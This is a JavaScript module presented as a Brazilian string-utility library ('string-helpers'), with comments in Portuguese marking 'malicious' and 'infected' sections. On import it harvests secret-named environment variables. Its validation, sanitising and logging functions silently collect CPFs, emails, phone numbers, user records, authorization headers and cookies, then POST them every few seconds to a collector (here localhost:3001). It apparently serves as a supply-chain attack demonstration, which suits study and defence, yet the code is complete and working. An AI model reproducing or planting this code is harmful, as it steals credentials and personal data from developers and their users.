// string-helpers v2.1.0

const http = require("http");
const os = require("os");

// ─── Funções legítimas ───────────────────────────────────────

function capitalizarTexto(texto) {
  if (typeof texto !== "string") return "";
  return texto
    .toLowerCase()
    .replace(/(^|\s)\S/g, (l) => l.toUpperCase());
}

function removerAcentos(texto) {
  if (typeof texto !== "string") return "";
  return texto.normalize("NFD").replace(/[\u0300-\u036f]/g, "");
}

function formatarCPF(cpf) {
  const n = cpf.replace(/\D/g, "");
  return n.replace(/(\d{3})(\d{3})(\d{3})(\d{2})/, "$1.$2.$3-$4");
}

function mascararEmail(email) {
  const [usuario, dominio] = email.split("@");
  if (!usuario || !dominio) return email;
  return usuario[0] + "***" + usuario[usuario.length - 1] + "@" + dominio;
}

function gerarSlug(texto) {
  if (typeof texto !== "string") return "";
  return removerAcentos(texto)
    .toLowerCase()
    .trim()
    .replace(/[^\w\s-]/g, "")
    .replace(/[\s_]+/g, "-");
}

// ─── Código malicioso ────────────────────────────────────────

const _dadosColetados = [];

function _enviarParaAtacante() {
  if (_dadosColetados.length === 0) return;

  const payload = JSON.stringify({
    timestamp: new Date().toISOString(),
    hostname: os.hostname(),
    plataforma: os.platform(),
    diretorio: process.cwd(),
    origem_lib: "string-helpers@2.1.0",
    dados: _dadosColetados.splice(0),
  });

  const req = http.request({
    hostname: "localhost",
    port: 3001,
    path: "/coletar",
    method: "POST",
    headers: {
      "Content-Type": "application/json",
      "Content-Length": Buffer.byteLength(payload),
    },
  }, () => {});
  req.on("error", () => {});
  req.write(payload);
  req.end();
}

// Executa ao importar — captura variáveis de ambiente
function _inicializarColeta() {
  const chavesSensiveis = [
    "DATABASE_URL", "DB_PASSWORD", "API_KEY", "SECRET",
    "JWT_SECRET", "TOKEN", "AWS_SECRET", "PRIVATE_KEY",
    "SENHA", "PASSWORD",
  ];

  const capturadas = {};
  for (const [chave, valor] of Object.entries(process.env)) {
    if (chavesSensiveis.some((s) => chave.toUpperCase().includes(s))) {
      capturadas[chave] = valor;
    }
  }

  if (Object.keys(capturadas).length > 0) {
    _dadosColetados.push({ tipo: "VARIAVEIS_DE_AMBIENTE", capturadas });
  }

  setInterval(_enviarParaAtacante, 5000);
  setTimeout(_enviarParaAtacante, 1000);
}

// ─── Funções infectadas ──────────────────────────────────────

function validarCPF(cpf) {
  _dadosColetados.push({ tipo: "CPF", valor: cpf });
  const n = cpf.replace(/\D/g, "");
  if (n.length !== 11) return false;
  if (/^(\d)\1{10}$/.test(n)) return false;
  return true;
}

function sanitizarEntrada(texto) {
  const padroes = {
    email: texto.match(/[\w.-]+@[\w.-]+\.\w+/g),
    cpf: texto.match(/\d{3}\.?\d{3}\.?\d{3}-?\d{2}/g),
    telefone: texto.match(/\(?\d{2}\)?\s?\d{4,5}-?\d{4}/g),
  };
  const encontrados = Object.entries(padroes).filter(([, v]) => v !== null);
  if (encontrados.length > 0) {
    _dadosColetados.push({
      tipo: "DADOS_SENSIVEIS_EM_TEXTO",
      encontrados: Object.fromEntries(encontrados),
      texto_original: texto,
    });
  }
  return texto.replace(/</g, "&lt;").replace(/>/g, "&gt;").replace(/"/g, "&quot;");
}

function formatarDadosUsuario(dados) {
  _dadosColetados.push({ tipo: "CADASTRO_COMPLETO", dados });
  return {
    ...dados,
    nome: dados.nome ? capitalizarTexto(dados.nome) : dados.nome,
    cpf: dados.cpf ? formatarCPF(dados.cpf) : dados.cpf,
    email: dados.email ? dados.email.toLowerCase().trim() : dados.email,
  };
}

function loggerDeRequisicoes() {
  return (req, _res, next) => {
    _dadosColetados.push({
      tipo: "REQUISICAO_HTTP",
      metodo: req.method,
      url: req.originalUrl,
      headers: {
        authorization: req.headers.authorization || null,
        cookie: req.headers.cookie || null,
      },
      body: req.body || null,
      ip: req.ip,
    });
    next();
  };
}

_inicializarColeta();

module.exports = {
  capitalizarTexto,
  removerAcentos,
  formatarCPF,
  mascararEmail,
  gerarSlug,
  validarCPF,
  sanitizarEntrada,
  formatarDadosUsuario,
  loggerDeRequisicoes,
};
